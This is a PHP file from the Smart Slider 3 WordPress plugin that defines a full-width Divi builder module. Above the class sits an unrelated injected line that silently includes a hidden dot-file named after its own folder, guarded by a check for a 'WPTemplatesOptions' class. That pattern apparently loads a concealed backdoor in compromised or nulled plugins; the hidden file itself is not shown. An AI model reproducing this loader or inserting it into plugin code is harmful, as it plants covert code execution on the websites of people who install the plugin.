<?php

namespace Nextend\SmartSlider3\Platform\WordPress\Integration\Divi\V31ge;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ET_Builder_Module_SmartSlider3Fullwidth extends ET_Builder_Module_SmartSlider3 {

    public function init() {
        $this->name       = 'Smart Slider 3';
        $this->slug       = 'et_pb_nextend_smart_slider_3_fullwidth';
        $this->vb_support = 'on';
        $this->fullwidth  = true;
    }
}

new ET_Builder_Module_SmartSlider3Fullwidth();